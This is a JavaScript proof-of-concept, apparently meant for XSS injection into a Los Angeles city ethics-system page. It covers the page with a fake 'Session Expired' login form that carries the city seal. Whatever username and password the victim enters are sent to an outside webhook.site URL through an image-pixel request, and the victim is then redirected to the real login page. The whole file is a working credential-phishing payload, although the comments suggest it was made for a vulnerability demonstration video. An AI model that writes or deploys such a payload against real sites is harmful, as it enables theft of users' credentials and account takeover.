(function() {
    // 1. Detenemos la carga y limpiamos TODO para evitar el scroll
    window.stop();
    
    // Forzamos un reseteo total del CSS de la página original
    const style = document.createElement('style');
    style.innerHTML = `
        html, body { 
            margin: 0 !important; 
            padding: 0 !important; 
            height: 100% !important; 
            overflow: hidden !important; 
        }
        #poc-container {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: #f0f2f5; display: flex; justify-content: center;
            align-items: center; z-index: 2147483647; font-family: sans-serif;
        }
    `;
    document.head.appendChild(style);

    // 2. Creamos el contenedor del Login (Sin necesidad de scroll)
    const container = document.createElement('div');
    container.id = 'poc-container';
    container.innerHTML = `
        <div style="width: 360px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #0056b3;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Seal_of_Los_Angeles.svg/200px-Seal_of_Los_Angeles.svg.png" style="width: 80px; margin-bottom: 20px;">
            <h2 style="margin: 0 0 10px; color: #333;">Session Expired</h2>
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Please re-authenticate to continue in the Ethics System.</p>
            <input id="u" type="text" placeholder="Username" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <input id="p" type="password" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <button id="go" style="width: 100%; padding: 10px; background: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">Sign In</button>
        </div>
    `;

    document.body.prepend(container);

    // 3. Envío de datos corregido (Webhook Fix)
    document.getElementById('go').onclick = function() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        
        if(!user || !pass) return alert("Fields required");

        this.innerHTML = "Authenticating...";
        
        // Usamos una imagen (Pixel Tracking) para saltar bloqueos de CORS del Webhook
        const exfilUrl = `https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91?u=${encodeURIComponent(user)}&p=${encodeURIComponent(pass)}&t=${Date.now()}`;
        const i = new Image();
        i.src = exfilUrl;

        // Redirigir después de enviar para que el video de la PoC sea perfecto
        setTimeout(() => {
            window.location.href = "https://ethics.lacity.gov/efs/index.cfm?fuseaction=login";
        }, 1000);
    };
})();
